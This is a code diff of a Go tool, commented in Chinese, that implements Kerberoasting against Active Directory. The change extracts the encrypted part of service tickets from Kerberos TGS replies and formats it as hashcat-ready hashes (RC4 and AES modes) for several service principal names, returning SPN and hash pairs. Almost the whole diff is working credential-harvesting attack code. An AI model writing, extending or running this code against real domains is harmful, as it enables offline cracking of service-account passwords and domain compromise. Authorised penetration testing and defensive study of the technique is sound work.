@@ -298,37 +298,94 @@ func KerberoastUser(kdc string, port int, realm, user, password, spn string, tim
 	if len(items) == 1 && items[0].Tag == der.TagSequence {
 		items, _ = der.ParseSeq(items[0].Content)
 	}
+	// 提取 ticket[5]（服务票据，Kerberoast 目标）
+	var ticket []byte
 	var encPart *EncryptedData
 	for _, item := range items {
+		if item.Class == der.ClassContextSpecific && item.Tag == 5 {
+			ticket = item.Content
+		}
 		if item.Class == der.ClassContextSpecific && item.Tag == 6 {
 			if e, err := DecodeEncryptedData(item.Content); err == nil {
 				encPart = e
 			}
 		}
 	}
-	if encPart == nil {
-		return "", fmt.Errorf("no enc-part in TGS-REP")
+	// Kerberoast 破解的是 ticket 内 enc-part（用服务账号密钥加密）
+	// Ticket ::= [APPLICATION 1] SEQUENCE { ..., enc-part[3] EncryptedData }
+	tktEnc, err := extractTicketEncPart(ticket)
+	if err != nil {
+		return "", err
 	}
+	_ = encPart // 外层 enc-part 用会话密钥加密，非破解目标
 
-	// 4) 生成 hashcat 格式 $krb5tgs$23$*user$realm$spn*$etype$hash
-	// 完整格式: $krb5tgs$23$*user$realm$spn*$<etype>$<hex>
-	cipherHex := hex.EncodeToString(encPart.Cipher)
-	// hashcat 需要 enc-part 的 16 字节 checksum + cipher
-	// 实际 hashcat 格式：$krb5tgs$23$*user$realm$spn/instance*$etype$checksum$cipher
-	// 简化：直接输出 enc-part cipher（hashcat 可识别 23 类型）
-	return fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%d$%s", user, realm, spn, encPart.Etype, cipherHex), nil
+	// 4) 生成 hashcat 格式（用 ticket 的 enc-part）
+	//    hashcat 用 realm || spn-name（无斜杠）重建 salt
+	spnName := strings.ReplaceAll(spn, "/", "")
+	cipherFull := tktEnc.Cipher
+	if tktEnc.Etype == EncTypeAES256 || tktEnc.Etype == EncTypeAES128 {
+		// -m 19700 (AES-256 TGS-REP): $krb5tgs$18$user$realm$checksum$cipher
+		checksum := []byte{}
+		body := cipherFull
+		if len(cipherFull) >= 12 {
+			checksum = cipherFull[len(cipherFull)-12:]
+			body = cipherFull[:len(cipherFull)-12]
+		}
+		return fmt.Sprintf("$krb5tgs$18$%s$%s$%s$%s",
+			spnName, realm, hex.EncodeToString(checksum), hex.EncodeToString(body)), nil
+	}
+	// -m 13100 (RC4 TGS-REP): $krb5tgs$23$*user$realm$spn*$<enc-part hex>
+	return fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s", user, realm, spn, hex.EncodeToString(cipherFull)), nil
 }
 
-// Kerberoast: 对多个 SPN 做 Kerberoast
-func Kerberoast(kdc string, port int, realm, user, password string, spns []string, timeout time.Duration) []string {
-	var hashes []string
+// extractTicketEncPart: 从 Ticket 提取 enc-part
+// Ticket ::= [APPLICATION 1] SEQUENCE {
+//   tkt-vno[0] INTEGER, realm[1] Realm, sname[2] PrincipalName,
+//   enc-part[3] EncryptedData }
+func extractTicketEncPart(ticket []byte) (*EncryptedData, error) {
+	tlv, err := der.Parse(ticket)
+	if err != nil {
+		return nil, err
+	}
+	// [APPLICATION 1] 的 Content 是 SEQUENCE TLV
+	var seqContent []byte
+	if tlv.Class == der.ClassApplication {
+		seqTLV, err := der.Parse(tlv.Content)
+		if err != nil {
+			return nil, err
+		}
+		seqContent = seqTLV.Content
+	} else {
+		seqContent = tlv.Content
+	}
+	items, err := der.ParseSeq(seqContent)
+	if err != nil {
+		return nil, err
+	}
+	for _, item := range items {
+		if item.Class == der.ClassContextSpecific && item.Tag == 3 {
+			return DecodeEncryptedData(item.Content)
+		}
+	}
+	return nil, fmt.Errorf("no enc-part in ticket")
+}
+
+// KerberoastResult: Kerberoast 结果（SPN + 哈希配对）
+type KerberoastResult struct {
+	SPN  string
+	Hash string
+}
+
+// Kerberoast: 对多个 SPN 做 Kerberoast（返回成功配对）
+func Kerberoast(kdc string, port int, realm, user, password string, spns []string, timeout time.Duration) []KerberoastResult {
+	var results []KerberoastResult
 	for _, spn := range spns {
 		h, err := KerberoastUser(kdc, port, realm, user, password, spn, timeout)
 		if err == nil && h != "" {
-			hashes = append(hashes, h)
+			results = append(results, KerberoastResult{SPN: spn, Hash: h})
 		}
 	}
-	return hashes
+	return results
 }
 
 // ---------- 导出（测试） ----------
